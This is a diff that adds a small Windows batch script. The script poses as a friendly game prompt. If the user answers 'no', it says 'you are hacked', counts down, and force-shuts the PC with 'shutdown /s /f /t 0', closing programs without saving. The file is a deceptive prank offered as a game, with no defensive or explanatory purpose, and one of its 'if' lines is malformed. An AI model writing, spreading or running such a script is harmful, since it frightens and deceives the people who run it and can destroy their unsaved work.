@@ -1,0 +1,18 @@
+@ echo off
+
+echo Hey, Do you play the Game  (only answer yes or no)
+set /p Game=
+if%Game%==yes goto Let's play 
+if %Game%==no goto Try to play
+:Let's play
+echo Game start soon...
+echo meet you on the game :)
+pause
+exit
+:Try to play
+echo but I want to play with you .....hehehehe
+echo you are hacked...
+echo your pc will crash in 10 seconds
+timeout 10
+shutdown /s /f  /t 0 
+ 
